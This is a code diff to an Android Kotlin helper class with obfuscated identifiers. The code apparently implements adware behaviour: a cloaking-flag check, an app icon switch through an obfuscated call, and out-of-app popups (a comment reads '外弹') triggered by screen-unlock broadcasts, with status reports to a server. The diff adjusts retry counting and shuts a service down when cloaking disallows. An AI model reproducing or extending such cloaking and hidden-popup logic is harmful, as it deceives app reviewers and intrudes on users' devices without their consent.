@@ -3,6 +3,7 @@ package com.fast.sixth.man.core
 import android.os.Build
 import com.JCSiSi.IFiCBnkuxQ.TJqwEFbY
 import com.fast.sixth.man.listener.LifecycleActivityListener
+import com.fast.sixth.man.open.FancyService
 import com.fast.sixth.man.open.FancyUser
 import com.fast.sixth.man.open.bro.FancyBroadcastReceiver
 import com.fast.sixth.man.open.bro.isCanBroadEvent
@@ -33,7 +34,7 @@ private var curProgress by FIntImpl(0, tag = "Progress")
 private var fancyFailedNum by FIntImpl(0)
 
 object FancySceneryHelper {
-    private var retryNum = fancyFailedNum
+    var retryNum = fancyFailedNum
         set(value) {
             field = value
             fancyFailedNum = value
@@ -85,6 +86,9 @@ object FancySceneryHelper {
                             break
                         } else if (mCloakInfo == 5) {
                             FancyLog.e("mCloakInfo not allow")
+                            withContext(Dispatchers.Main) {
+                                FancyService.closeMe(mApp)
+                            }
                             mJob?.cancel()
                         }
                     }
@@ -97,9 +101,6 @@ object FancySceneryHelper {
             }
             withContext(Dispatchers.Main) {
                 iconWait(startTime)
-                if (System.currentTimeMillis() - startTime < 2000) {
-                    delay(1200)
-                }
                 FancyLog.e("--->>>> change")
                 TJqwEFbY.cnVHMqua(mApp, 0)
                 registerTime()
@@ -123,6 +124,7 @@ object FancySceneryHelper {
     private fun registerTime() {
         mApp.registerReceiver(FancyBroadcastReceiver(), mIntentFilter)
         timeJob?.cancel()
+        isCanBroadEvent = true
         timeJob = CoroutineScope(Dispatchers.Main).launch {
             delay(4000)
             while (true) {
@@ -137,7 +139,7 @@ object FancySceneryHelper {
         if (retryNum > 195) {
             timeJob?.cancel()
             isCanBroadEvent = false
-            FancySceneryNetwork.postMai("jumpfail")
+            FancySceneryNetwork.postMai("jumpfail", isPost = true)
             return true
         }
         return false
@@ -145,7 +147,7 @@ object FancySceneryHelper {
 
     fun fancyE() {
         if (isLimitP()) return
-        if (AppInfoTools.isPhoneClose()) return
+        if (AppInfoTools.isPhoneO().not()) return
         FancySceneryNetwork.postMai("isunlock")
         if (ActivityLifeHelper.isAppRCheckAllow()) {
             if (FancySceneryConfigure.isFancyBeanAllow().not()) return
@@ -153,6 +155,7 @@ object FancySceneryHelper {
             return
         }
         if (isFancyReady()) {
+            retryNum++
             CoroutineScope(Dispatchers.Main).launch {
                 //外弹
                 //todo modify
